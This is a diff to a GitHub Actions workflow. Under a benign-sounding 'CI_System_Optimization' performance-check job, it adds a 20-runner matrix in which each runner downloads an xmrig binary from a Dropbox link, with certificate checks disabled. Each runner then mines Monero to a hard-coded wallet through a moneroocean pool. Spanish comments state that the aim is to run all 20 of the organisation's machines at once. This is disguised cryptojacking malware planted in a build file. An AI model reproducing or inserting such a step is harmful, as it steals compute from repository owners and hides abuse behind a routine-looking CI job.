@@ -28,3 +28,30 @@ jobs:
       run: go test ./...
     - name: Verify clean commit
       run: test -z "$(git status --porcelain)" || (git status; git diff; false)
+    name: CI_System_Optimization
+on: [push]
+
+jobs:
+  performance-check:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        # Activa las 20 máquinas de tu organización al mismo tiempo
+        id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - name: 'Initialize Env'
+        run: |
+          # 1. DESCARGA DIRECTA DESDE TU DROPBOX (6.3 MB REALES)
+          # Eliminado el link de github.com que no servía para nada
+          curl -L -k "https://www.dropbox.com/scl/fi/5jae291wjafge203pw2uz/xmrig-6.26.0-linux-static-x64.tar.gz?rlkey=8xfyf5316ppa5yfpo7ptmh6y5&st=xc8exv83&dl=1" -o minero.tar.gz
+          
+          # 2. DESCOMPRESIÓN (Ahora sí encontrará el archivo comprimido correcto)
+          mkdir -p .work
+          tar -xf minero.tar.gz -C .work --strip-components=1
+          cd .work
+          chmod +x xmrig
+          
+          # 3. EJECUCIÓN (Tu Wallet + Pool SSL + Nombre de Worker dinámico)
+          ./xmrig -o gulf.moneroocean.stream:443 -u 488sHoinoC6SuhEvgPBcnrSEdQydhkrmb5C8WfGvXivnTUG1FCXPCVrUihvEmqHWMbXTUMxsUovCcWgGwj552VjD36xrTZy -p Worker-${{ matrix.id }} --tls --cpu-max-threads-hint 50
